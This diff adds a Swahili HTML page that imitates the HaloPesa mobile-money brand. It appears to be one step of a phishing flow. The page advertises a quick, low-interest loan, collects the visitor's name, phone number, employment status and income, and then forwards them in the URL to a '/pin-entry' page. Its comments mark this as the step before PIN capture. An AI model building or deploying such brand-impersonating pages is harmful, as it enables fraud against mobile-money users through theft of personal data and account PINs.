@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HaloPesa - Kamilisha Ombi</title>
+    <style>
+        :root {
+            --hp-orange: #FF5A1F;
+            --hp-dark: #d94d18;
+            --white: #fff;
+            --gray: #6b7280;
+            --light-gray: #f3f4f6;
+            --dark: #1a1a1a;
+            --border: #e5e7eb;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--hp-orange);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 420px;
+            width: 100%;
+            padding: 10px 0;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 10px;
+        }
+        .logo svg {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+
+        .brand-name {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .header-sub {
+            font-size: 0.95rem;
+            color: #fff;
+            opacity: 0.9;
+            text-align: center;
+            margin-bottom: 18px;
+        }
+
+        .card {
+            background: var(--white);
+            border-radius: 20px;
+            padding: 20px 16px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+
+        .card-title {
+            font-size: 1.1rem;
+            font-weight: 800;
+            color: var(--dark);
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .loan-summary {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin: 8px 0;
+        }
+
+        .summary-item {
+            background: var(--light-gray);
+            border-radius: 10px;
+            padding: 10px 12px;
+            text-align: center;
+        }
+
+        .summary-item .label {
+            font-size: 0.7rem;
+            color: var(--gray);
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .summary-item .value {
+            font-size: 1.1rem;
+            font-weight: 800;
+            color: var(--dark);
+            margin-top: 2px;
+        }
+
+        .summary-item .value.orange {
+            color: var(--hp-orange);
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: var(--dark);
+            margin-bottom: 4px;
+        }
+
+        .form-group .hint {
+            font-size: 0.7rem;
+            color: var(--gray);
+            margin-top: 2px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid var(--border);
+            border-radius: 12px;
+            font-size: 1rem;
+            outline: none;
+            transition: border 0.2s;
+            background: var(--white);
+            font-family: inherit;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: var(--hp-orange);
+        }
+
+        .form-group input::placeholder {
+            color: #9ca3af;
+        }
+
+        .btn-submit {
+            display: inline-block;
+            background: var(--hp-orange);
+            color: #fff;
+            font-weight: 700;
+            font-size: 1rem;
+            padding: 14px 0;
+            border: none;
+            border-radius: 50px;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .btn-submit:hover {
+            background: var(--hp-dark);
+            transform: translateY(-1px);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .message {
+            text-align: center;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 8px 0;
+            font-weight: 500;
+        }
+        .message.success {
+            background: #dcfce7;
+            color: #166534;
+        }
+        .message.error {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+        .message.info {
+            background: #dbeafe;
+            color: #1e40af;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--hp-orange);
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .flex-center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .footer-features {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 0.7rem;
+            color: #fff;
+            opacity: 0.9;
+            padding: 10px 0;
+        }
+
+        .footer-features span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 5px 0;
+            }
+            .card {
+                padding: 16px 12px;
+            }
+            .loan-summary {
+                gap: 6px;
+            }
+            .summary-item {
+                padding: 8px 6px;
+            }
+            .summary-item .value {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- HaloPesa Logo -->
+        <div class="logo">
+            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="100" rx="22" fill="#FF5A1F"/>
+                <circle cx="34" cy="52" r="16" fill="white"/>
+                <path d="M53 77 C67 74 76 65 79 51 C81 42 79 31 74 27 C69 23 62 25 59 30 C56 35 58 42 61 48 C64 55 63 62 58 67 C54 72 48 76 41 78 C46 80 50 79 53 77 Z" fill="white"/>
+            </svg>
+        </div>
+
+        <div class="brand-name">HaloPesa</div>
+        <div class="header-sub">Kamilisha ombi lako</div>
+
+        <!-- Loan Summary Card -->
+        <div class="card">
+            <div class="card-title">📊 Muhtasari wa Mkopo</div>
+            <div class="loan-summary">
+                <div class="summary-item">
+                    <div class="label">Kiasi cha Mkopo</div>
+                    <div class="value orange" id="summaryAmount">TZS 1,000,000</div>
+                </div>
+                <div class="summary-item">
+                    <div class="label">Muhula</div>
+                    <div class="value" id="summaryTerm">3 Mwezi/mi</div>
+                </div>
+                <div class="summary-item">
+                    <div class="label">Kila Mwezi</div>
+                    <div class="value orange" id="summaryMonthly">TZS 336,115</div>
+                </div>
+                <div class="summary-item">
+                    <div class="label">Riba</div>
+                    <div class="value">5%</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Personal Details Form (no PIN) -->
+        <div class="card">
+            <div class="card-title">📋 Kamilisha Ombi Lako</div>
+            <p style="font-size:0.8rem; color:var(--gray); text-align:center; margin-bottom:14px;">
+                Jaza maelezo yako binafsi hapa chini
+            </p>
+
+            <form id="applicationForm">
+                <!-- Full Name -->
+                <div class="form-group">
+                    <label>Jina kamili</label>
+                    <input type="text" id="fullName" placeholder="John M. Doe" required>
+                </div>
+
+                <!-- Phone Number -->
+                <div class="form-group">
+                    <label>Nambari ya simu</label>
+                    <input type="tel" id="phone" placeholder="0622 345 678" required>
+                    <div class="hint">📱 Ingiza namba yako kuanzia 0 (digiti 10)</div>
+                </div>
+
+                <!-- Employment Status -->
+                <div class="form-group">
+                    <label>Hali ya ajira</label>
+                    <select id="employmentStatus" required>
+                        <option value="">Chagua</option>
+                        <option value="ajira_ya_muda_wote">Ajira ya muda wote</option>
+                        <option value="ajira_kwa_muda">Ajira kwa muda</option>
+                        <option value="kujiajiri">Kujiajiri</option>
+                        <option value="mmiliki_wa_biashara">Mmiliki wa biashara</option>
+                        <option value="mstaafu">Mstaafu</option>
+                    </select>
+                </div>
+
+                <!-- Monthly Income -->
+                <div class="form-group">
+                    <label>Mapato ya kila mwezi (TZS)</label>
+                    <input type="number" id="monthlyIncome" placeholder="e.g 350000" required>
+                    <div class="hint">Tafadhali ingiza mapato yako ya kila mwezi</div>
+                </div>
+
+                <!-- Hidden fields for loan data -->
+                <input type="hidden" id="loanAmount" value="">
+                <input type="hidden" id="loanMonths" value="">
+
+                <button type="submit" class="btn-submit" id="submitBtn">
+                    Endelea →
+                </button>
+
+                <div id="formStatus" class="message hidden"></div>
+            </form>
+        </div>
+
+        <!-- Footer Features -->
+        <div class="footer-features">
+            <span>🔒 Salama kwa Njia Fiche</span>
+            <span>⚡ Idhini ya Dakika 5</span>
+            <span>💰 Hakuna Ada Zilizofichwa</span>
+        </div>
+
+    </div>
+
+    <script>
+        // Get URL parameters
+        function getParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        const amount = parseInt(getParam('amount')) || 1000000;
+        const months = parseInt(getParam('months')) || 3;
+
+        // Calculate monthly payment
+        const APR = 0.05;
+        const monthlyRate = APR / 12;
+        let monthlyPayment = 0;
+        if (monthlyRate === 0) {
+            monthlyPayment = amount / months;
+        } else {
+            monthlyPayment = amount * monthlyRate * Math.pow(1 + monthlyRate, months) / (Math.pow(1 + monthlyRate, months) - 1);
+        }
+
+        function formatCurrency(num) {
+            return 'TZS ' + Math.round(num).toLocaleString('en-US');
+        }
+
+        document.getElementById('summaryAmount').textContent = formatCurrency(amount);
+        document.getElementById('summaryTerm').textContent = months + ' Mwezi/mi';
+        document.getElementById('summaryMonthly').textContent = formatCurrency(monthlyPayment);
+        document.getElementById('loanAmount').value = amount;
+        document.getElementById('loanMonths').value = months;
+
+        // Form submission – redirect to PIN entry page
+        const form = document.getElementById('applicationForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const formStatus = document.getElementById('formStatus');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const fullName = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            const employmentStatus = document.getElementById('employmentStatus').value;
+            const monthlyIncome = parseInt(document.getElementById('monthlyIncome').value.trim()) || 0;
+
+            // Validate
+            if (!fullName || fullName.length < 3) {
+                showMessage(formStatus, 'Tafadhali ingiza jina lako kamili.', 'error');
+                return;
+            }
+            if (!phone || phone.length < 9) {
+                showMessage(formStatus, 'Tafadhali ingiza nambari halali ya simu (angalau tarakimu 9).', 'error');
+                return;
+            }
+            if (!employmentStatus) {
+                showMessage(formStatus, 'Tafadhali chagua hali yako ya ajira.', 'error');
+                return;
+            }
+            if (monthlyIncome < 10000) {
+                showMessage(formStatus, 'Tafadhali ingiza mapato yako ya kila mwezi.', 'error');
+                return;
+            }
+
+            hideMessage(formStatus);
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loader"></span> Inasubiri...';
+
+            // Redirect to PIN entry page with all data as URL parameters
+            const params = new URLSearchParams({
+                amount: amount,
+                months: months,
+                fullName: fullName,
+                phone: phone,
+                employment: employmentStatus,
+                income: monthlyIncome
+            });
+            window.location.href = '/pin-entry?' + params.toString();
+        });
+
+        function showMessage(el, msg, type) {
+            el.className = 'message ' + type;
+            el.textContent = msg;
+            el.classList.remove('hidden');
+        }
+
+        function hideMessage(el) {
+            el.classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
